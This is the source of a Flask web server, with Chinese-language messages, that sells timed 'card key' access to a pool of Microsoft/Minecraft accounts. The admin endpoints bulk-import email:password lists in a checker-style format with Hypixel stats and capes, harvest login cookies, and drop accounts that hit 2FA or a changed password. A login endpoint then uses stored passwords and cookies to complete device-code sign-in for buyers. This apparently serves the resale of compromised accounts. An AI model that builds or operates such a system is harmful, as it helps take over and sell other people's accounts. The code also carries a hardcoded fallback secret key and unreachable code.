from flask import Flask, jsonify, request, send_from_directory, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import json
import os
import re
from datetime import datetime, timedelta
from pathlib import Path
import threading
import time
from functools import wraps
from dotenv import load_dotenv
from database import Database

load_dotenv()

app = Flask(__name__, static_folder='static', static_url_path='')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

SECRET_KEY = os.environ.get('SECRET_KEY', 'minecraft_autologin_secret_key_2026')

app.secret_key = SECRET_KEY
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

BASE_DIR = Path(__file__).parent

db = Database()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return jsonify({'success': False, 'message': '未登录'}), 401
        return f(*args, **kwargs)
    return decorated_function

def validate_cookie_data(cookie_data):
    if not isinstance(cookie_data, dict):
        return False, "Cookie格式错误"
    if len(cookie_data) < 10:
        return False, f"Cookie不完整（只有{len(cookie_data)}个）"
    required_cookies = ['__Host-MSAAUTH', 'WLSSC']
    missing = [c for c in required_cookies if c not in cookie_data]
    if missing:
        return False, f"缺少关键Cookie: {', '.join(missing)}"
    return True, "Cookie有效"

def get_available_accounts():
    accounts = db.get_all_accounts()
    available = []
    for acc in accounts:
        if acc.get('disabled'):
            continue
        cookie = db.get_cookie(acc['email'])
        if cookie:
            available.append({
                'email': acc['email'],
                'created_at': acc.get('created_at', ''),
                'last_login': acc.get('last_login')
            })
    available.sort(key=lambda x: x['created_at'])
    return available

@app.route('/')
def index():
    if not session.get('card_verified'):
        return send_from_directory('static', 'verify.html')
    return send_from_directory('static', 'index.html')

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return send_from_directory('static', 'login.html')
    return send_from_directory('static', 'admin.html')

@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if db.verify_admin(username, password):
        session['logged_in'] = True
        return jsonify({'success': True})
    else:
        return jsonify({'success': False, 'message': '用户名或密码错误'}), 401

@app.route('/api/logout', methods=['POST'])
def admin_logout():
    session.pop('logged_in', None)
    return jsonify({'success': True})

@app.route('/api/available-count', methods=['GET'])
def available_count():
    available = get_available_accounts()
    return jsonify({'count': len(available)})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    device_code = data.get('device_code', '').strip().upper()
    ip = request.remote_addr
    card_key = session.get('card_key')
    expire_at = session.get('expire_at')
    
    if len(device_code) != 8:
        if card_key:
            db.increment_fail_count(card_key)
        db.add_log(ip, 'login', 'failed', '设备代码格式错误', device_code=device_code, card_key=card_key)
        return jsonify({'success': False, 'message': '设备代码必须是8位'}), 400
    
    if not expire_at:
        db.add_log(ip, 'login', 'failed', '未验证卡密', device_code=device_code)
        return jsonify({'success': False, 'message': '请先验证卡密'}), 401
    
    expire_date = datetime.fromisoformat(expire_at)
    now = datetime.now()
    time_diff = expire_date - now
    days_left = time_diff.days
    hours_left = time_diff.total_seconds() / 3600
    
    if hours_left < 0:
        db.add_log(ip, 'login', 'failed', f'卡密已过期 (过期时间:{expire_date}, 当前时间:{now}, 剩余:{hours_left:.1f}小时)', device_code=device_code, card_key=card_key)
        return jsonify({'success': False, 'message': '卡密已过期'}), 403
    
    account = db.get_smart_account(card_key, days_left)
    if not account:
        if card_key:
            db.increment_fail_count(card_key)
        db.add_log(ip, 'login', 'failed', '没有符合条件的账号', device_code=device_code, card_key=card_key)
        return jsonify({'success': False, 'message': '找客服处理'}), 400
    email = account['email']
    acc = db.get_account(email)
    password = acc['password']
    script_dir = Path(__file__).parent.absolute()
    cookie_data = db.get_cookie(email)
    
    try:
        valid, msg = validate_cookie_data(cookie_data)
        if not valid:
            if card_key:
                db.increment_fail_count(card_key)
            db.add_log(ip, 'login', 'failed', msg, email=email, device_code=device_code, card_key=card_key)
            return jsonify({'success': False, 'message': msg}), 400
        
        temp_cookie_file = script_dir / f"temp_cookie_{device_code}.json"
        with open(temp_cookie_file, 'w', encoding='utf-8') as f:
            json.dump(cookie_data, f)
        
        import subprocess
        result = subprocess.run(
            [str(script_dir / 'venv/bin/python'), '-u', str(script_dir / 'auto_login_http.py'), 
             str(temp_cookie_file.absolute()), device_code, password, email],
            capture_output=True,
            text=True,
            cwd=str(script_dir),
            env={**os.environ, 'PYTHONUNBUFFERED': '1'},
            timeout=60
        )
        
        detail_log = result.stdout
        if result.stderr:
            detail_log += '\n\n=== STDERR ===\n' + result.stderr
        
        if temp_cookie_file.exists():
            temp_cookie_file.unlink()
        
        success = result.returncode == 0
        
        if success:
            if card_key:
                db.increment_success_count(card_key)
                db.update_last_used_email(card_key, email)
            db.update_account(email, last_login=datetime.now(), disabled=True)
            db.add_log(ip, 'login', 'success', '登录成功', email=email, device_code=device_code, card_key=card_key, detail_log=detail_log)
            
            try:
                from email_alert import EmailAlert
                email_alert = EmailAlert()
                email_alert.send_login_success(card_key or '无卡密', email, device_code, ip)
            except Exception as e:
                print(f"[警告] 发送登录成功邮件失败: {e}")
            
            return jsonify({'success': True, 'message': '登录成功', 'email': email})
        else:
            if card_key:
                db.increment_fail_count(card_key)
            error_msg = '登录失败'
            if '设备代码已过期' in detail_log or 'expired' in detail_log.lower():
                db.add_log(ip, 'login', 'failed', '设备代码已过期', email=email, device_code=device_code, card_key=card_key, detail_log=detail_log)
                return jsonify({'success': False, 'message': '设备代码已过期，请重新获取', 'email': email})
            elif 'Cookie已失效' in detail_log or '需要2FA' in detail_log or '密码错误' in detail_log:
                db.delete_cookie(email)
                db.delete_account(email)
                if 'Cookie已失效' in detail_log:
                    error_msg = 'Cookie已失效'
                elif '需要2FA' in detail_log:
                    error_msg = '需要2FA验证'
                else:
                    error_msg = '密码错误'
                db.add_log(ip, 'login', 'failed', f'账号异常已删除: {error_msg}', email=email, device_code=device_code, card_key=card_key, deleted=True, detail_log=detail_log)
                return jsonify({'success': False, 'message': '账号异常，已自动删除', 'email': email})
            else:
                lines = detail_log.strip().split('\n')
                last_lines = [l for l in lines[-3:] if l.strip()]
                if last_lines:
                    error_msg = last_lines[-1][:100]
                db.add_log(ip, 'login', 'failed', error_msg, email=email, device_code=device_code, card_key=card_key, detail_log=detail_log)
                return jsonify({'success': False, 'message': error_msg, 'email': email})
    except Exception as e:
        import traceback
        detail_log = traceback.format_exc()
        if card_key:
            db.increment_fail_count(card_key)
        db.add_log(ip, 'login', 'error', f'系统错误: {str(e)}', email=email, device_code=device_code, card_key=card_key, detail_log=detail_log)
        return jsonify({'success': False, 'message': f'系统错误: {str(e)}'}), 500

@app.route('/api/accounts', methods=['GET'])
@login_required
def get_accounts():
    accounts = db.get_all_accounts()
    result = []
    for acc in accounts:
        has_cookie = db.get_cookie(acc['email']) is not None
        result.append({
            'email': acc['email'],
            'password': '********',
            'level': acc.get('level', 0),
            'mcname': acc.get('mcname', 'Unknown'),
            'subscription': acc.get('subscription', ''),
            'has_cookie': has_cookie,
            'cookie_status': acc.get('cookie_status', 'none'),
            'last_login': acc.get('last_login'),
            'created_at': acc.get('created_at'),
            'disabled': acc.get('disabled', False)
        })
    return jsonify(result)

@app.route('/api/accounts/upload', methods=['POST'])
@login_required
def upload_accounts():
    if 'file' not in request.files:
        return jsonify({'success': False, 'message': '没有文件'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'success': False, 'message': '没有选择文件'}), 400
    if not file.filename.endswith('.txt'):
        return jsonify({'success': False, 'message': '只支持 .txt 文件'}), 400
    try:
        text = file.read().decode('utf-8')
        return process_account_text(text)
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/accounts', methods=['POST'])
@login_required
def add_accounts():
    data = request.json
    text = data.get('text', '')
    return process_account_text(text)

def process_account_text(text):
    new_count = 0
    duplicate_count = 0
    password_update_count = 0
    error_count = 0
    total_lines = 0
    start_time = time.time()
    pattern_full = r'\[(\d+)\]([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+):([^\s\|]+)\s*\|McName:([^\s\[]+)(?:\s*\[Hypixel:([^\]]+)\])?(?:\s*\[Capes:([^\]]+)\])?'
    pattern_subscription = r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+):([^\s\|]+)\s*\|?\s*\[?([^\]]*)\]?'
    pattern_simple = r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+):([^\s\|]+)'
    lines = text.strip().split('\n')
    processed_emails = {}
    
    def parse_subscription_info(line):
        subscription_days = 0
        auto_renew = False
        
        day_match = re.search(r'day:(\d+)', line)
        if day_match:
            subscription_days = int(day_match.group(1))
        
        if '自动续费' in line or 'auto renew' in line.lower():
            auto_renew = True
        
        return subscription_days, auto_renew
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        total_lines += 1
        
        subscription_days, auto_renew = parse_subscription_info(line)
        match_full = re.search(pattern_full, line)
        if match_full:
            level, email, password, mcname, hypixel, capes = match_full.groups()
            email = email.strip()
            password = password.strip()
            hypixel_data = {}
            if hypixel:
                for item in hypixel.split():
                    if ':' in item:
                        key, value = item.split(':', 1)
                        hypixel_data[key] = value.replace('-Coins', '')
            cape_list = [c.strip() for c in capes.split(',')] if capes else []
            key = f"{email}:{password}"
            if key in processed_emails:
                duplicate_count += 1
                continue
            processed_emails[key] = True
            existing = db.get_account(email)
            if existing and existing['password'] == password:
                duplicate_count += 1
            elif existing and existing['password'] != password:
                db.update_account(email, password=password, level=int(level), mcname=mcname.strip(), hypixel=hypixel_data, capes=cape_list, subscription_days=subscription_days, auto_renew=auto_renew)
                password_update_count += 1
            else:
                db.add_account(email, password, int(level), mcname.strip(), '', hypixel_data, cape_list, subscription_days, auto_renew)
                new_count += 1
            continue
        match_subscription = re.search(pattern_subscription, line)
        if match_subscription and '|' in line:
            email, password, subscription_info = match_subscription.groups()
            email = email.strip()
            password = password.strip()
            subscription_info = subscription_info.strip() if subscription_info else ''
            if not email or not password:
                error_count += 1
                continue
            key = f"{email}:{password}"
            if key in processed_emails:
                duplicate_count += 1
                continue
            processed_emails[key] = True
            existing = db.get_account(email)
            if existing and existing['password'] == password:
                duplicate_count += 1
            elif existing and existing['password'] != password:
                db.update_account(email, password=password, subscription=subscription_info, subscription_days=subscription_days, auto_renew=auto_renew)
                password_update_count += 1
            else:
                db.add_account(email, password, 0, 'Unknown', subscription_info, None, None, subscription_days, auto_renew)
                new_count += 1
            continue
        match_simple = re.search(pattern_simple, line)
        if match_simple:
            email, password = match_simple.groups()
            email = email.strip()
            password = password.strip()
            if not email or not password:
                error_count += 1
                continue
            key = f"{email}:{password}"
            if key in processed_emails:
                duplicate_count += 1
                continue
            processed_emails[key] = True
            existing = db.get_account(email)
            if existing and existing['password'] == password:
                duplicate_count += 1
            elif existing and existing['password'] != password:
                db.update_account(email, password=password, subscription_days=subscription_days, auto_renew=auto_renew)
                password_update_count += 1
            else:
                db.add_account(email, password, 0, 'Unknown', '', None, None, subscription_days, auto_renew)
                new_count += 1
        else:
            error_count += 1
    elapsed_time = time.time() - start_time
    return jsonify({'success': True, 'new_count': new_count, 'duplicate_count': duplicate_count, 'password_update_count': password_update_count, 'error_count': error_count, 'total_lines': total_lines, 'elapsed_time': round(elapsed_time, 2)})

    try:
        from email_alert import EmailAlert
        email_alert = EmailAlert()
        email_alert.send_accounts_imported(new_count, duplicate_count, password_update_count, error_count, total_lines)
    except Exception as e:
        print(f"[警告] 发送账号导入邮件失败: {e}")
    
    return jsonify({'success': True, 'new_count': new_count, 'duplicate_count': duplicate_count, 'password_update_count': password_update_count, 'error_count': error_count, 'total_lines': total_lines, 'elapsed_time': round(elapsed_time, 2)})

@app.route('/api/accounts/<email>', methods=['DELETE'])
@login_required
def delete_account(email):
    db.delete_account(email)
    db.delete_cookie(email)
    return jsonify({'success': True})

@app.route('/api/accounts/<email>/toggle', methods=['POST'])
@login_required
def toggle_account(email):
    acc = db.get_account(email)
    if acc:
        new_status = not acc.get('disabled', False)
        db.update_account(email, disabled=new_status)
        return jsonify({'success': True, 'disabled': new_status})
    return jsonify({'success': False}), 404

@app.route('/api/accounts/delete-used', methods=['POST'])
@login_required
def delete_used_accounts():
    accounts = db.get_all_accounts()
    deleted_count = 0
    for acc in accounts:
        if acc.get('disabled'):
            db.delete_account(acc['email'])
            db.delete_cookie(acc['email'])
            deleted_count += 1
    return jsonify({'success': True, 'deleted_count': deleted_count})

@app.route('/api/cookies/get', methods=['POST'])
@login_required
def get_cookies():
    data = request.json
    emails = data.get('emails', [])
    def process():
        total = len(emails)
        for i, email in enumerate(emails):
            acc = db.get_account(email)
            if not acc:
                socketio.emit('cookie_progress', {'current': i + 1, 'total': total, 'email': email, 'status': 'skip', 'message': '账号不存在'})
                continue
            password = acc['password']
            socketio.emit('cookie_progress', {'current': i + 1, 'total': total, 'email': email, 'status': 'processing', 'message': '正在获取...'})
            import subprocess
            script_dir = Path(__file__).parent
            try:
                result = subprocess.run([str(script_dir / 'venv/bin/python'), str(script_dir / 'get_cookie_only.py'), f"{email}:{password}"], capture_output=True, text=True, cwd=str(script_dir), timeout=30)
                safe_email = re.sub(r'[^\w\-_\.]', '_', email)
                source_cookie = script_dir / "cookies" / f"{safe_email}.json"
                if source_cookie.exists():
                    with open(source_cookie, 'r', encoding='utf-8') as f:
                        cookie_data = json.load(f)
                    db.save_cookie(email, cookie_data)
                    db.update_account(email, cookie_status='valid')
                    source_cookie.unlink()
                    socketio.emit('cookie_progress', {'current': i + 1, 'total': total, 'email': email, 'status': 'success', 'message': '成功'})
                else:
                    error_msg = '获取失败'
                    should_delete = False
                    if result.returncode != 0:
                        if '登录失败' in result.stdout or '密码错误' in result.stdout:
                            error_msg = '密码错误或账号异常'
                            should_delete = True
                        elif '无法获取登录页面' in result.stdout:
                            error_msg = '网络错误'
                        elif '获取 Cookie 失败' in result.stdout:
                            error_msg = 'Cookie获取失败'
                        elif result.stderr:
                            error_msg = f'错误: {result.stderr[:100]}'
                        else:
                            lines = result.stdout.strip().split('\n')
                            last_lines = [l for l in lines[-5:] if l.strip()]
                            if last_lines:
                                error_msg = ' | '.join(last_lines)[:150]
                            else:
                                error_msg = f'脚本错误 (code {result.returncode})'
                    if should_delete:
                        db.delete_account(email)
                        db.delete_cookie(email)
                        error_msg += ' (已自动删除)'
                    else:
                        db.update_account(email, cookie_status='failed')
                    socketio.emit('cookie_progress', {'current': i + 1, 'total': total, 'email': email, 'status': 'failed', 'message': error_msg})
            except Exception as e:
                socketio.emit('cookie_progress', {'current': i + 1, 'total': total, 'email': email, 'status': 'failed', 'message': str(e)})
        socketio.emit('cookie_complete', {'success': True})
    thread = threading.Thread(target=process)
    thread.start()
    return jsonify({'success': True})

@app.route('/api/stats', methods=['GET'])
@login_required
def get_stats():
    accounts = db.get_all_accounts()
    total = len(accounts)
    available = 0
    used = 0
    for acc in accounts:
        if acc.get('disabled'):
            used += 1
        else:
            available += 1
    return jsonify({'total': total, 'available': available, 'used': used})

@app.route('/api/cards', methods=['GET'])
@login_required
def get_cards():
    cards = db.get_all_cards()
    result = []
    for card in cards:
        result.append({'card_key': card['card_key'], 'duration': card['duration'], 'duration_days': card['duration_days'], 'created_at': card['created_at'], 'used': card['used'], 'used_at': card.get('used_at'), 'used_by': card.get('used_by')})
    return jsonify(result)

@app.route('/api/cards/generate', methods=['POST'])
@login_required
def generate_cards():
    data = request.json
    count = data.get('count', 1)
    duration = data.get('duration', '1day')
    card_type = data.get('type', 'normal')
    duration_map = {'1day': 1, '2day': 2, '3day': 3, '7day': 7, '15day': 15, '30day': 30, '1month': 30, '2month': 60, '3month': 90, '6month': 180, '12month': 365}
    duration_days = duration_map.get(duration, 1)
    generated = []
    for _ in range(count):
        import random
        import string
        part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        part3 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        card_key = f"auto-login-{part1}-{part2}-{part3}"
        db.add_card(card_key, duration, duration_days, card_type)
        generated.append(card_key)
    return jsonify({'success': True, 'count': len(generated), 'cards': generated})

@app.route('/api/cards/verify', methods=['POST'])
def verify_card():
    data = request.json
    card_key = data.get('card_key', '').strip()
    ip = request.remote_addr
    if not card_key:
        db.add_log(ip, 'card_verify', 'failed', '卡密为空', card_key=card_key)
        return jsonify({'success': False, 'message': '请输入卡密'}), 400
    card = db.get_card(card_key)
    if not card:
        db.add_log(ip, 'card_verify', 'failed', '卡密不存在', card_key=card_key)
        return jsonify({'success': False, 'message': '卡密不存在'}), 404
    if card.get('banned'):
        db.add_log(ip, 'card_verify', 'failed', '卡密已被封禁', card_key=card_key)
        return jsonify({'success': False, 'message': '卡密已被封禁'}), 403
    if card.get('used'):
        db.add_log(ip, 'card_verify', 'failed', '卡密已被使用', card_key=card_key)
        return jsonify({'success': False, 'message': '卡密已被使用'}), 400
    expire_date = datetime.now() + timedelta(days=card['duration_days'])
    db.use_card(card_key, expire_date, ip)
    session['card_verified'] = True
    session['card_key'] = card_key
    session['expire_at'] = expire_date.isoformat()
    session['card_type'] = card.get('type', 'normal')
    db.add_log(ip, 'card_verify', 'success', f"卡密验证成功，有效期{card['duration']}", card_key=card_key)
    return jsonify({'success': True, 'message': '验证成功', 'duration': card['duration'], 'expire_at': expire_date.isoformat(), 'type': card.get('type', 'normal')})

@app.route('/api/cards/check', methods=['GET'])
def check_card():
    if session.get('card_verified'):
        expire_at = session.get('expire_at')
        if expire_at:
            expire_date = datetime.fromisoformat(expire_at)
            if datetime.now() < expire_date:
                return jsonify({'verified': True, 'card_key': session.get('card_key'), 'expire_at': expire_at, 'type': session.get('card_type', 'normal')})
    return jsonify({'verified': False})

@app.route('/api/cards/<card_key>', methods=['DELETE'])
@login_required
def delete_card(card_key):
    db.delete_card(card_key)
    return jsonify({'success': True})

@app.route('/api/logs', methods=['GET'])
@login_required
def get_logs():
    limit = request.args.get('limit', 100, type=int)
    logs = db.get_logs(limit)
    return jsonify(logs)

@app.route('/api/logs/<int:log_id>', methods=['DELETE'])
@login_required
def delete_log(log_id):
    db.delete_log(log_id)
    return jsonify({'success': True})

@app.route('/api/logs/<int:log_id>/detail', methods=['GET'])
@login_required
def get_log_detail(log_id):
    logs = db.get_logs(1000)
    log = next((l for l in logs if l['id'] == log_id), None)
    if log:
        return jsonify({'success': True, 'detail': log.get('detail_log', '无详细日志')})
    return jsonify({'success': False, 'message': '日志不存在'}), 404

@app.route('/api/logs/delete-all', methods=['POST'])
@login_required
def delete_all_logs():
    deleted_count = db.delete_all_logs()
    return jsonify({'success': True, 'deleted_count': deleted_count})

@app.route('/api/users', methods=['GET'])
@login_required
def get_users():
    users = db.get_all_used_cards()
    return jsonify(users)

@app.route('/api/users/<card_key>/ban', methods=['POST'])
@login_required
def ban_user(card_key):
    db.ban_card(card_key)
    return jsonify({'success': True})

@app.route('/api/users/<card_key>/unban', methods=['POST'])
@login_required
def unban_user(card_key):
    db.unban_card(card_key)
    return jsonify({'success': True})

@app.route('/api/subscription/update', methods=['POST'])
@login_required
def update_subscriptions():
    count = db.update_subscription_days()
    return jsonify({'success': True, 'updated_count': count})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)
